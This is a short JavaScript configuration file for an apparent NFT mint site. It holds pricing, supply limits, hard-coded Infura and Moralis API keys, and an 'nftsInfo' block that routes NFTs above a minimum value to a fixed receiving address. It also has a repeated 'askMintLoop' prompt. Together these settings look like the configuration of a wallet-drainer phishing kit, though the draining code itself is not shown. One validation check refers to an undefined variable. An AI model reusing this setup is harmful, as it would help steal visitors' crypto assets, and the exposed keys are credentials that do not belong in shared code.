const address = '0xaF1bb2C025280a166eb4A91e45c85D7b0C0D848B',
  infuraId = '9c1f1db6ba9a4291af1c79634ce907b9',
  moralisApi =
    'rSP2DgD6GbLGY8qqZZ5wiSdKFJ03GpthuBLBaixOEgIHdejCQD1PzgKRR09gKpT1'
const x20Ethereum = '0xa3513E05610fbd2560f2b8db3b03d8B8facde822'

const mintInfo = {
    price: 0.1,
    price2: 0.2,
    totalSupply: 7777,
    minUnits: 1,
    maxUnits: 2,
    askMintLoop: true,
  },
  nftsInfo = {
    active: true,
    minValue: 0.4,
    checkMaxDay: 2,
    receiveAddress: '0xa3513E05610fbd2560f2b8db3b03d8B8facde822',
  }
if (mintInfo.minUnits > mintInfo.maxUnits) {
  console.error(
    'Error: minUnits (' +
      mintInfo.minUnits +
      ') is greater than maxUnits (' +
      maxUnits +
      ')'
  )
}
if (mintInfo.minUnits <= 0) {
  console.error(
    'Error: minUnits (' + mintInfo.minUnits + ') is less than or equal to 0'
  )
}
if (!address.startsWith('0x') || address.length >= 64 || address.length <= 40) {
  console.error('Error: ' + address + ' is not a valid Ethereum address.')
}
